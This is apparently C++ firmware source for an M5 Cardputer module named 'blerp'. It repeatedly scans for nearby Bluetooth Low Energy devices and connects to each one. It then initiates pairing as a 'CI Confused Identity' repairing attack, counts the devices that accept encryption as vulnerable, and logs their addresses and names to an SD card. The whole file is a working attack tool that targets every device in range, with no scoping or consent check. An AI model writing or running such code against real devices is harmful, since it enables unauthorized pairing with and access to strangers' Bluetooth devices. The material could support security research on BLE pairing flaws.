#include "module_api.h"
#include "registry.h"
#include "loader.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include "M5Unified.h"
#include "cardputer_keyboard.h"
#include "ui/mod_common.h"
#include "nimble/nimble_port.h"
#include "nimble/nimble_port_freertos.h"
#include "host/ble_hs.h"
#include "host/ble_gap.h"
#include "services/gap/ble_svc_gap.h"
#include <cstdio>
#include <cstring>

static const char *TAG = "blerp";
static const char *ID  = "blerp";
static const ctos_api_t *s_api = nullptr;

#define MAX_DEVICES 32

typedef struct {
    ble_addr_t addr;
    char       name[64];
    int8_t     rssi;
} ble_dev_t;

static ble_dev_t s_devlist[MAX_DEVICES];
static volatile int s_dev_count = 0;
static volatile int s_hit_count = 0;
static volatile bool s_scanning  = false;
static SemaphoreHandle_t s_scan_done;

// ---------------------------------------------------------------------------
// Gap event handlers
// ---------------------------------------------------------------------------
static int scan_event_cb(struct ble_gap_event *ev, void *arg)
{
    if (ev->type == BLE_GAP_EVENT_DISC) {
        struct ble_gap_disc_desc *d = &ev->disc;
        if (s_dev_count >= MAX_DEVICES) return 0;
        ble_dev_t *e = &s_devlist[s_dev_count];
        memcpy(&e->addr, &d->addr, sizeof(ble_addr_t));
        e->rssi = d->rssi;
        e->name[0] = '\0';
        // Try to extract device name from adv data
        struct ble_hs_adv_fields fields;
        if (ble_hs_adv_parse_fields(&fields, d->data, d->length_data) == 0 && fields.name) {
            size_t n = fields.name_len < sizeof(e->name)-1 ? fields.name_len : sizeof(e->name)-1;
            memcpy(e->name, fields.name, n);
            e->name[n] = '\0';
        }
        s_dev_count++;
    }
    if (ev->type == BLE_GAP_EVENT_DISC_COMPLETE) {
        s_scanning = false;
        if (s_scan_done) xSemaphoreGive(s_scan_done);
    }
    return 0;
}

static int connect_event_cb(struct ble_gap_event *ev, void *arg)
{
    if (ev->type == BLE_GAP_EVENT_CONNECT) {
        if (ev->connect.status == 0) {
            ble_gap_security_initiate(ev->connect.conn_handle);
        } else {
            s_api->log(ID, "Connect failed");
        }
    }
    if (ev->type == BLE_GAP_EVENT_ENC_CHANGE) {
        if (ev->enc_change.status == 0) {
            s_hit_count++;
            s_api->log(ID, "CI pairing SUCCEEDED (VULNERABLE)");
        } else {
            s_api->log(ID, "CI pairing rejected (protected)");
        }
        ble_gap_terminate(ev->enc_change.conn_handle, BLE_ERR_REM_USER_CONN_TERM);
    }
    if (ev->type == BLE_GAP_EVENT_DISCONNECT) {
        if (s_scan_done) xSemaphoreGive(s_scan_done);
    }
    return 0;
}

static void do_scan(uint32_t dur_ms)
{
    s_dev_count = 0;
    s_scanning  = true;
    struct ble_gap_disc_params dp = {};
    dp.filter_duplicates = 1;
    dp.passive = 0;
    dp.itvl    = 160;
    dp.window  = 80;
    ble_gap_disc(BLE_OWN_ADDR_PUBLIC, dur_ms, &dp, scan_event_cb, NULL);
}

static bool attempt_ci(int idx)
{
    if (idx >= s_dev_count) return false;
    char msg[64];
    snprintf(msg, sizeof(msg), "CI attempt %d/%d %02x:%02x:%02x:%02x:%02x:%02x",
             idx+1, s_dev_count,
             s_devlist[idx].addr.val[5], s_devlist[idx].addr.val[4],
             s_devlist[idx].addr.val[3], s_devlist[idx].addr.val[2],
             s_devlist[idx].addr.val[1], s_devlist[idx].addr.val[0]);
    s_api->log(ID, msg);

    struct ble_gap_conn_params cp = {};
    xSemaphoreTake(s_scan_done, 0); // clear
    int rc = ble_gap_connect(BLE_OWN_ADDR_PUBLIC, &s_devlist[idx].addr, 10000, &cp,
                              connect_event_cb, NULL);
    if (rc != 0) return false;
    // Wait for connect result (max 15s)
    xSemaphoreTake(s_scan_done, pdMS_TO_TICKS(15000));
    return false; // result reported via log
}

static void blerp_task(void *arg)
{
    FILE *log_f = fopen("/sdcard/blerp_log.txt", "a");

    ble_nimble_ensure_started();
    ble_svc_gap_device_name_set("ctOS-blerp");

    while (module_registry_is_running(ID)) {
        s_api->log(ID, "Scanning BLE (10s)...");
        xSemaphoreTake(s_scan_done, 0);
        do_scan(10000);
        // Wait for scan to complete
        xSemaphoreTake(s_scan_done, pdMS_TO_TICKS(12000));
        s_scanning = false;

        char disp[64];
        snprintf(disp, sizeof(disp), "Found %d devices", s_dev_count);
        s_api->display_print(ID, disp);

        if (log_f) {
            fprintf(log_f, "=== BLERP scan: %d devices ===\n", s_dev_count);
            for (int i = 0; i < s_dev_count; i++)
                fprintf(log_f, "[%d] %02x:%02x:%02x:%02x:%02x:%02x \"%s\" RSSI=%d\n",
                        i, s_devlist[i].addr.val[5], s_devlist[i].addr.val[4],
                        s_devlist[i].addr.val[3], s_devlist[i].addr.val[2],
                        s_devlist[i].addr.val[1], s_devlist[i].addr.val[0],
                        s_devlist[i].name, s_devlist[i].rssi);
            fflush(log_f);
        }

        for (int i = 0; i < s_dev_count && module_registry_is_running(ID); i++) {
            attempt_ci(i);
            vTaskDelay(pdMS_TO_TICKS(500));
        }

        s_api->display_print(ID, "Cycle done. Restarting in 30s...");
        vTaskDelay(pdMS_TO_TICKS(30000));
    }

    if (log_f) fclose(log_f);
    s_api->log(ID, "BLERP stopped");
    module_registry_set_running(ID, false);
    vTaskDelete(nullptr);
}

extern "C" esp_err_t blerp_main(const ctos_api_t *api)
{
    if (module_registry_is_running(ID)) return ESP_OK;
    s_api      = api;
    s_dev_count = 0;
    s_hit_count = 0;
    s_scanning  = false;
    if (!s_scan_done) s_scan_done = xSemaphoreCreateBinary();
    module_registry_set_running(ID, true);
    if (xTaskCreate(blerp_task, TAG, 12288, nullptr, 5, nullptr) != pdPASS) {
        module_registry_set_running(ID, false);
        return ESP_FAIL;
    }
    return ESP_OK;
}

extern "C" void blerp_ui_show(void)
{
    module_loader_start(ID);
    mod_drain_keys();
    bool log_view = false;

    while (true) {
        M5.update();
        CardputerKb.update();

        if (log_view) { mod_show_log_view(ID, "BLERP"); log_view = false; mod_drain_keys(); continue; }

        M5.Display.fillScreen(TFT_BLACK);
        M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
        M5.Display.setCursor(0, 0); M5.Display.print("BLERP — BLE CI REPAIRING");

        M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
        M5.Display.setCursor(0, 14);
        M5.Display.printf("Status: %s", s_scanning ? "SCANNING" : "IDLE");
        M5.Display.setCursor(0, 26);
        M5.Display.printf("Devices: %d found", s_dev_count);
        M5.Display.setCursor(0, 38);
        M5.Display.printf("Hits:    %d vulnerable", s_hit_count);
        M5.Display.setCursor(0, 50);
        M5.Display.print("Attack: CI Confused Identity");
        M5.Display.setCursor(0, 62);
        M5.Display.print("Log: /sdcard/blerp_log.txt");

        // Show first 2 discovered devices
        int shown = s_dev_count < 2 ? s_dev_count : 2;
        for (int i = 0; i < shown; i++) {
            M5.Display.setCursor(0, 74 + i * MOD_LH);
            M5.Display.printf("[%d] %02x:%02x:%02x %s", i,
                              s_devlist[i].addr.val[5], s_devlist[i].addr.val[4],
                              s_devlist[i].addr.val[3], s_devlist[i].name);
        }

        M5.Display.setTextColor(TFT_DARKGREY, TFT_BLACK);
        M5.Display.setCursor(0, M5.Display.height() - 10);
        M5.Display.print("[L]log [`]back");

        if (!CardputerKb.isChange() || !CardputerKb.isPressed()) { vTaskDelay(pdMS_TO_TICKS(50)); continue; }
        auto kb = CardputerKb.getState();
        char key = (char)kb.key.key.key_data.keys[0];

        if (key == '`' || key == 27) return;
        else if (key == 'l' || key == 'L') log_view = true;
        vTaskDelay(pdMS_TO_TICKS(150));
    }
}
